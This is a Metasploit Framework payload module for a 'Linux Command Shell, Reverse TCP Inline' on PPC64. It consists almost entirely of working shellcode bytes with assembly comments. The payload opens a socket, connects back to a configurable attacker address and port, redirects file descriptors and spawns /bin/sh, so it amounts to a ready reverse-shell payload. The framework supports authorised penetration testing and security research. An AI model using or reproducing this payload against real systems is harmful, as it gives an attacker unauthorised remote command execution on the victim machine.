##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => [ ARCH_PPC64, ARCH_CBEA64 ],
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ [ 54, 58 ], 'ADDR16MSB' ],
              'LPORT'    => [ 62, 'n' ],
            },
          'Payload' =>
            "\x7f\xff\xfa\x78"     +#   xor     r31,r31,r31                #
            "\x3b\xa0\x01\xff"     +#   li      r29,511                    #
            "\x3b\x9d\xfe\x02"     +#   addi    r28,r29,-510               #
            "\x3b\x7d\xfe\x03"     +#   addi    r27,r29,-509               #
            "\xfb\xe1\xff\xf9"     +#   stdu    r31,-8(r1)                 #
            "\xfb\x81\xff\xf9"     +#   stdu    r28,-8(r1)                 #
            "\xfb\x61\xff\xf9"     +#   stdu    r27,-8(r1)                 #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            "\x38\x7d\xfe\x02"     +#   addi    r3,r29,-510                #
            "\x38\x1d\xfe\x67"     +#   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "\x7c\x7a\x1b\x78"     +#   mr      r26,r3                     #
            "\x3b\x3d\xfe\x11"     +#   addi    r25,r29,-495               #
            "\x3e\xe0\x7f\x00"     +#   lis     r23,32512                  #
            "\x62\xf7\x00\x01"     +#   ori     r23,r23,1                  #
            "\x3a\xc0\x04\xd2"     +#   li      r22,1234                   #
            "\x96\xe1\xff\xfc"     +#   stwu    r23,-4(r1)                 #
            "\x96\xc1\xff\xfc"     +#   stwu    r22,-4(r1)                 #
            "\x93\x61\xff\xfe"     +#   stw     r27,-2(r1)                 #
            "\x7c\x35\x0b\x78"     +#   mr      r21,r1                     #
            "\xfb\x21\xff\xf9"     +#   stdu    r25,-8(r1)                 #
            "\xfa\xa1\xff\xf9"     +#   stdu    r21,-8(r1)                 #
            "\xfb\x41\xff\xf9"     +#   stdu    r26,-8(r1)                 #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            "\x38\x7d\xfe\x04"     +#   addi    r3,r29,-508                #
            "\x38\x1d\xfe\x67"     +#   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "\x7f\x64\xdb\x78"     +#   mr      r4,r27                     #
            "\x7f\x43\xd3\x78"     +#   mr      r3,r26                     #
            "\x38\x1d\xfe\x40"     +#   addi    r0,r29,-448                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "\x37\x7b\xff\xff"     +#   addic.  r27,r27,-1                 #
            "\x40\x80\xff\xec"     +#   bge+    <cntsockcode64+108>        #
            "\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
            "\x40\x82\xff\xfd"     +#   bnel+   <cntsockcode64+132>        #
            "\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
            "\x3b\xde\x01\xff"     +#   addi    r30,r30,511                #
            "\x38\x7e\xfe\x25"     +#   addi    r3,r30,-475                #
            "\x98\xbe\xfe\x2c"     +#   stb     r5,-468(r30)               #
            "\xf8\xa1\xff\xf9"     +#   stdu    r5,-8(r1)                  #
            "\xf8\x61\xff\xf9"     +#   stdu    r3,-8(r1)                  #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            "\x38\x1d\xfe\x0c"     +#   addi    r0,r29,-500                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "/bin/sh"
        }
      ))
  end

end
